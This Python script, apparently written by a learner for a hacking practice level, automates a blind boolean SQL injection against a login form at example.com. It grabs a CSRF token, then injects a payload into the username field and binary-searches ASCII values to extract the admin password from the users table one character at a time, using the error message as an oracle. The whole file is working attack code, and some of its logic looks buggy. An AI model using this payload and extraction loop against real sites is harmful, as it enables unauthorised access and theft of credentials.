import urllib.request
import urllib.parse
import http.cookiejar
import re

#this is outdated but its helping me now so it goes here

#since this is a learning experience ya gotta comment

#really you need to comment anyway

#here i ping the previous page for a GET req
#this gives me valid session/csrf tokens so that i can automate fine
cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
req0 = urllib.request.Request('http://example.com')
resp0 = opener.open(req0)
page0 = resp0.read()

result = re.findall(b'name="csrf" value="(\w*)"', page0)

csrf = result[0].decode("utf-8")
#print(csrf)


#now i ready mah data to be posted
url = 'http://example.com/level7/post_index'

x=1
y=2
while(True):
    
    lb = 0
    rb = 255
    center = rb/2
    count = 0
    while (count < 8):
        values = {'csrf' : csrf,
                  'username' : "admin' AND ASCII(SUBSTRING((SELECT MIN(password) AS First FROM users WHERE username='admin'),%d,%d))>=%d AND 1='1" % (x, y, center),
                  'password' : 'garbage'}
    
    
        data = urllib.parse.urlencode(values)
        bin_dat = data.encode('ascii')
        req = urllib.request.Request(url, data=bin_dat)
        response = opener.open(req)
        the_page = response.read()
    
        res = re.findall(b'red">(.*)</span>', the_page)
    
        oracle = res[0].decode('utf-8')
    
        if (oracle == 'Invalid password'): #true
            lb = center + 1
            center = (rb+lb)/2
            
        else: #oracle == 'user does not exist' or false
            rb = center
            center = (rb+lb)/2
            
        count = count + 1
    
    asc = int(center - 1)
    char = chr(asc)
    print(char)

    x = x+1
    y = y+1
    input()
   
    


